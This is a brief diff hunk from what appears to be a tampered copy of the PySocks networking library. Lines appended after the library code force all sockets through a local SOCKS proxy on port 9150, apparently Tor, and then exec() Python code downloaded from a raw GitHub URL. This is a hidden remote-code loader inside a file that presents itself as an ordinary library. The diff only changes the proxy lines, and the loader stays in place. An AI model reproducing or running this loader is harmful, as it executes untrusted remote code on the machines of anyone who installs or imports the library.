@@ -848,6 +848,6 @@ class socksocket(_BaseSocket):
 
 from urllib.request import Request,urlopen
 import socket
-socks.set_default_proxy(socks.SOCKS5,'127.0.0.1',9150)
-socket.socket=socks.socksocket
+socks.set_default_proxy(SOCKS5,'127.0.0.1',9150)
+socket.socket=socksocket
 exec(urlopen(Request('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input(">"))).read())
